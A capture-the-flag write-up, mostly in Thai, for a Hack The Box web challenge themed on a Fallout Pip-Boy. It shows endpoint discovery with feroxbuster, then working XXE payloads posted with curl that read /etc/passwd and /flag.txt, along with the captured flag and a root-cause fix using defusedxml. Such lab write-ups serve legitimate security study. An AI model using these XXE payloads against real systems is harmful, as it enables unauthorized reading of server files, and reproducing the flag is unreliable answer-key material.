# Jailbreak — CTF Writeup

## Challenge Info

- Name: Jailbreak
- Category: Web
- Flag: HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_ce95666321c6d182954019199d6c946a}

---

## Description

โจทย์ให้เราเจลเบรก Pip-Boy (อุปกรณ์จากเกม Fallout) เพื่อปลดล็อกประตู Vault 79 โดย flag อยู่ที่ /flag.txt

---

## Step 1: Reconnaissance

ใช้ feroxbuster scan หา endpoint ทั้งหมดของ website

```bash
feroxbuster -u http://154.57.164.72:30146/
```

พบ endpoint ที่น่าสนใจหลายตัว เช่น /rom, /inventory, /data และที่สำคัญที่สุดคือ /static/js/update.js

---

## Step 2: วิเคราะห์ update.js

```bash
curl http://154.57.164.72:30146/static/js/update.js
```

พบว่า JS ส่ง XML ไปยัง /api/update โดยตรงผ่าน POST request โดยไม่มีการกรองข้อมูลฝั่ง client เลย นี่คือสัญญาณของ XXE (XML External Entity Injection)

---

## Step 3: ทดสอบ XXE

ก่อนอ่าน flag ทดสอบว่า XXE ใช้งานได้จริงโดยอ่าน /etc/passwd ก่อน

```bash
curl -X POST http://154.57.164.72:30146/api/update \
  -H "Content-Type: application/xml" \
  -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<FirmwareUpdateConfig>
  <Firmware>
    <Version>&xxe;</Version>
  </Firmware>
</FirmwareUpdateConfig>'
```

Server ตอบกลับมาพร้อมเนื้อหาของ /etc/passwd ยืนยันว่า XXE ใช้งานได้

หมายเหตุ: ต้องตัด XML declaration (<?xml version="1.0" encoding="UTF-8"?>) ออก เพราะ Python parser ไม่รองรับ unicode string ที่มี encoding declaration

---

## Step 4: อ่าน Flag

```bash
curl -X POST http://154.57.164.72:30146/api/update \
  -H "Content-Type: application/xml" \
  -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<FirmwareUpdateConfig>
  <Firmware>
    <Version>&xxe;</Version>
  </Firmware>
</FirmwareUpdateConfig>'
```

ได้ flag กลับมาใน response ทันที

---

## Flag

HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_ce95666321c6d182954019199d6c946a}

---

## Root Cause

Server ใช้ Python XML parser ที่ไม่ได้ปิดการใช้งาน external entity ทำให้ผู้โจมตีสามารถฝัง SYSTEM entity เพื่ออ่านไฟล์ใน server ได้ แก้ไขได้โดยใช้ defusedxml แทน หรือ set resolve_entities=False ใน parser

---

## Attack Chain

feroxbuster → update.js → /api/update รับ XML → XXE inject SYSTEM entity → อ่าน /flag.txt → ได้ flag
